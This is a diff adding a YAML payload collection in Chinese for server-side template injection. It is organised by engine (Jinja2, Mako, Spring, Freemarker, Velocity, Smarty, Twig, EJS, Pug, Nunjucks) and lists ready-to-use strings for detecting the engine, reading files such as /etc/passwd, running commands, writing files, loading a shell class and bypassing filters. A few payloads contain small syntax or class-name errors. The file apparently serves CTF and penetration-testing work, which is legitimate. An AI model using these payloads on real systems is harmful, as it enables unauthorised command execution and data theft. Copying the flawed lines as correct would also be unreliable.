@@ -1,0 +1,156 @@
+# SSTI (服务端模板注入) Payload 知识库
+# 来源: Des-CTF-Knowledge + Hunter 实战经验
+# 更新: 2026-06-02
+
+metadata:
+  category: ssti
+  description: "SSTI (服务端模板注入) Payload 集合"
+  version: "1.0"
+
+# ============================================
+# 1. 模板引擎检测
+# ============================================
+detection:
+  description: "检测模板引擎类型"
+  basic:
+    - "{{7*7}}"      # Jinja2/Twig/Smarty → 49
+    - "${7*7}"       # Freemarker/Velocity → 49
+    - "<%= 7*7 %>"   # ERB → 49
+    - "#{7*7}"       # Slim/Pug → 49
+    - "{{=7*7}}"     # Angular → 49
+    - "*{7*7}"       # Thymeleaf → 49
+    - "#{7*7}"       # Ruby → 49
+  advanced:
+    - "{{7*'7'}}"    # Jinja2 → 7777777, Twig → 49
+    - "{{dump)}}"    # 查看对象
+    - "{{config}}"   # Flask配置
+
+# ============================================
+# 2. Python Flask/Jinja2
+# ============================================
+jinja2:
+  description: "Jinja2 模板注入"
+  detection:
+    - "{{7*7}}"
+    - "{{config}}"
+    - "{{config.items()}}"
+  info_disclosure:
+    - "{{''.__class__.__mro__}}"
+    - "{{''.__class__.__mro__[2].__subclasses__()}}"
+    - "{{config.items()}}"
+  file_read:
+    - "{{''.__class__.__mro__[2].__subclasses__()[40]('flag').read()}}"
+    - "{{url_for.__globals__['__builtins__']['open']('flag').read()}}"
+    - "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}"
+  rce:
+    description: "命令执行"
+    os_popen:
+      - "{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}"
+    subprocess:
+      - "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}"
+    eval:
+      - "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('ls').read()\")}}"
+  write_file:
+    - "{{''.__class__.__mro__[1].__subclasses__()[40]('/tmp/shell', 'w').write('content')}}"
+  common_subclass_index:
+    - "os._wrap_close: 258"
+    - "FileLoader: 40"
+    - "warnings.catch_warnings: 需要遍历查找"
+
+# ============================================
+# 3. Python Mako
+# ============================================
+mako:
+  description: "Mako 模板注入"
+  rce:
+    - "<% import os %>${os.popen('id').read()}"
+    - "${self.module.cache.util.os.popen('id').read()}"
+
+# ============================================
+# 4. Java/Spring
+# ============================================
+spring:
+  description: "Spring 模板注入 (SpEL)"
+  detection:
+    - "${7*7}"
+    - "#{7*7}"
+  rce:
+    - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    - "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+    - "${T(org.springframework.cglib.core.ReflectUtils).defineClass('Shell',new javax.xml.bind.DatatypeConverter().parseBase64Binary('base64_class_bytecode'),new java.lang.ClassLoader()).newInstance()}"
+  file_read:
+    - "${T(java.io.Runtime).getRuntime().exec('cat /etc/passwd')}"
+
+# ============================================
+# 5. Java Freemarker
+# ============================================
+freemarker:
+  description: "Freemarker 模板注入"
+  rce:
+    - "<#assign ex='freemarker.template.utility.Execute'>${ex('id')}"
+    - "${'freemarker.template.utility.Execute'?new()('id')}"
+    - "<#assign classLoader=object?api.class.protectionDomain.classLoader><#assign clazz=classLoader.loadClass('ClassWithoutConstructor')><#assign object=clazz?new()>"
+
+# ============================================
+# 6. Java Velocity
+# ============================================
+velocity:
+  description: "Velocity 模板注入"
+  rce:
+    - "#set($exec=$rt.getRuntime().exec('id'))"
+    - "#set($input=$exec.getInputStream())"
+    - "#set($str=$rt.getRuntime().exec('id').getInputStream())"
+
+# ============================================
+# 7. PHP Smarty
+# ============================================
+smarty:
+  description: "Smarty 模板注入"
+  rce:
+    - "{php}echo `id`;</php>"
+    - "{system('id')}"
+    - "{literal}<script>alert(1)</script>{/literal}"
+
+# ============================================
+# 8. PHP Twig
+# ============================================
+twig:
+  description: "Twig 模板注入"
+  rce:
+    - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+    - "{{['id']|filter('system')}}"
+    - "{{['id']|map('system')}}"
+
+# ============================================
+# 9. Node.js
+# ============================================
+ejs:
+  description: "EJS 模板注入"
+  rce:
+    - "<%= global.process.mainModule.require('child_process').execSync('id') %>"
+    - "<%= require('child_process').execSync('id') %>"
+
+pug:
+  description: "Pug 模板注入"
+  rce:
+    - "- var x = global.process.mainModule.require('child_process').execSync('id')"
+    - "#{global.process.mainModule.require('child_process').execSync('id')}"
+
+nunjucks:
+  description: "Nunjucks 模板注入"
+  rce:
+    - "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"
+
+# ============================================
+# 10. 绕过技巧
+# ============================================
+bypass:
+  description: "SSTI 绕过技巧"
+  filter_bypass:
+    - "{{request.application.__globals__.__builtins__['open']('flag').read()}}"  # 用request绕过
+    - "{{lipsum.__globals__['os'].popen('id').read()}}"  # 用lipsum绕过
+    - "{{cycler.__init__.__globals__.os.popen('id').read()}}"  # 用cycler绕过
+    - "{{joiner.__init__.__globals__.os.popen('id').read()}}"  # 用joiner绕过
+  charset_bypass:
+    - "{{()|attr('__class__')|attr('__mro__')}}"  # 用attr绕过点号
+    - "{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')}}"  # 用十六进制绕过
